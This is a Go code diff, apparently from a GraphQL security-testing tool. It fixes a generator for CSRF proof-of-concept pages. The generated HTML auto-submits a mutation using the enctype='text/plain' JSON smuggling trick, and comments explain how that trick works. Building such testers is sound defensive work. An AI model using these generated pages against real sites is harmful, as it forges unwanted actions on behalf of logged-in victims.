@@ -145,8 +145,18 @@ func RunCSRFTests(targetURL string, headers map[string]string, mutations []Opera
 }
 
 // generateCSRFPoC creates an HTML page with a form that submits a GraphQL mutation.
+// Uses the enctype="text/plain" trick: the form sends name=value as plaintext.
+// We put most of the JSON in the name, and absorb the = into a junk field.
 func generateCSRFPoC(targetURL string, mut OperationTarget) string {
-	query := strings.ReplaceAll(mut.Query, `"`, `\"`)
+	// Escape the query for embedding in JSON inside an HTML attribute.
+	query := strings.ReplaceAll(mut.Query, `\`, `\\`)
+	query = strings.ReplaceAll(query, `"`, `\"`)
+
+	// The form will send: <name>=<value>
+	// name = {"query":"<mutation>","_":"
+	// value = "}
+	// Result: {"query":"<mutation>","_":"="}  — valid JSON, the = is absorbed.
+	formName := fmt.Sprintf(`{"query":"%s","_":"`, query)
 
 	return fmt.Sprintf(`<!DOCTYPE html>
 <html>
@@ -155,7 +165,7 @@ func generateCSRFPoC(targetURL string, mut OperationTarget) string {
 <h2>CSRF PoC: %s</h2>
 <p>This page will automatically submit the mutation when loaded.</p>
 <form id="csrf-form" method="POST" action="%s" enctype="text/plain">
-  <input type="hidden" name='{"query":"' value='%s"}' />
+  <input type="hidden" name='%s' value='"}' />
   <input type="submit" value="Submit" />
 </form>
 <script>
@@ -165,5 +175,5 @@ func generateCSRFPoC(targetURL string, mut OperationTarget) string {
   }, 1000);
 </script>
 </body>
-</html>`, mut.Name, mut.Name, targetURL, query)
+</html>`, mut.Name, mut.Name, targetURL, formName)
 }
